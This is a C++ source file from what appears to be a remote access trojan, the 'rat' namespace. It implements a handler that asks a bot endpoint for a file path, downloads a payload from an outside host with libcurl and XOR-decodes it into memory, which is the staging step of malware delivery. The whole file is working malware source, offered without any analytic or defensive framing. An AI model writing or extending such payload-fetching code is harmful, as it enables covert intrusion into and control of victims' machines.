#include "rat/Handler.hpp"
#include "rat/handler/debug.hpp"
#include "rat/networking.hpp"

#include <array>
#include <curl/curl.h>
#include <simdjson.h>
#include <vector>

namespace rat::handler {
constexpr size_t HTTP_BUFFER_SIZE = 8 * 1024;

::rat::networking::NetworkingResult Handler::downloadXoredPayload(const std::string &File_Url) {
    ::rat::networking::NetworkingResult result = {CURLE_OK, 0};

    auto &curl_client = this->bot->curl_client;

    const std::string &downloading_file_url_schema = this->bot->getDownloadingFileUrl();

    std::vector<uint8_t> &payload_buffer = this->state.payload;
    std::string &xor_key = this->state.payload_key;

    if(File_Url.empty() || xor_key.empty()) {
        HANDLER_ERROR_LOG("Empty file url or key");
    }
    HANDLER_DEBUG_LOG("Before Operation Buffer size: {}", payload_buffer.size());

    std::string real_url_with_file_path = "";
    {
        std::array<char, 8 * HTTP_BUFFER_SIZE> http_response_buffer;
        auto http_response_result = curl_client.sendHttpRequest(File_Url.c_str(),
                                                                http_response_buffer.data(),
                                                                http_response_buffer.size());
        if(http_response_result.curl_code != CURLE_OK) {
            HANDLER_ERROR_LOG("FAILED at retrieving the http response, the json file "
                              "containing the actual path of the file");
            return http_response_result;
        }
        std::string json_raw(http_response_buffer.begin(),
                             http_response_buffer.begin() + http_response_result.size);
        simdjson::padded_string padded_json(json_raw);

        try {
            simdjson::ondemand::parser parser;
            simdjson::ondemand::document doc = parser.iterate(padded_json);

            auto ok_res = doc["ok"].get_bool();
            if(ok_res.error() || !ok_res.value())
                return http_response_result;

            std::string_view file_path = doc["result"]["file_path"].get_string();
            real_url_with_file_path = fmt::format("{}/{}", downloading_file_url_schema, file_path);
        } catch(const simdjson::simdjson_error &e) {
            HANDLER_ERROR_LOG("downloadFile JSON parsing failed: {}", e.what());
            http_response_result.curl_code = CURLE_RECV_ERROR;
            return http_response_result;
        }
    }
    ::rat::networking::XorDataContext xor_data_context = {&xor_key, 0, &payload_buffer};
    if((result.curl_code = curl_client.setUrl(real_url_with_file_path)) != CURLE_OK ||
       (result.curl_code = curl_client.setWriteCallBackFunction(
            &::rat::networking::_cbVectorXoredDataWrite)) != CURLE_OK ||
       (result.curl_code =
            curl_client.setOption(CURLOPT_WRITEDATA, static_cast<void *>(&xor_data_context))) !=
           CURLE_OK ||
       (result.curl_code = curl_client.setOption(CURLOPT_SSL_VERIFYPEER, 1L)) != CURLE_OK ||
       (result.curl_code = curl_client.setOption(CURLOPT_SSL_VERIFYHOST, 2L)) != CURLE_OK ||
       (result.curl_code = curl_client.setOption(CURLOPT_FOLLOWLOCATION, 1L)) != CURLE_OK ||
       (result.curl_code = curl_client.setOption(CURLOPT_TIMEOUT, 60L)) != CURLE_OK ||
       (result.curl_code = curl_client.setOption(CURLOPT_CONNECTTIMEOUT, 5L)) != CURLE_OK) {
        HANDLER_ERROR_LOG("DownloadData setup failed: %s", curl_easy_strerror(result.curl_code));
        curl_client.reset();
        HANDLER_DEBUG_LOG("Failed at setting download Options");
        return result;
    }

    result.curl_code = curl_client.perform();
    if(result.curl_code != CURLE_OK) {
        HANDLER_ERROR_LOG("Download data failed: %s", curl_easy_strerror(result.curl_code));
        curl_client.reset();
        return result;
    }
    curl_client.reset();
    HANDLER_DEBUG_LOG("XORed Data size {}", result.size);
    return result;
}

} // namespace rat::handler
